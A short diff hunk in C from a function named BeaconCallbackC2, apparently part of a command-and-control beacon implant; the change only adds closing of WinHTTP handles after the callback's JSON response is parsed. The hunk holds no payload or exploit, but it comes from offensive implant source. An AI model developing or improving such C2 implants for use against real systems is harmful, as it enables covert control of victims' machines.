@@ -563,6 +563,10 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     json_object_put(parsed_json);
     // Free ResBuffer
     free(ResBuffer);
+    // Cleanup handles
+    rWinHttpCloseHandle(hRequest);
+    rWinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hConnect);
     return argsBuffer;
 }
 
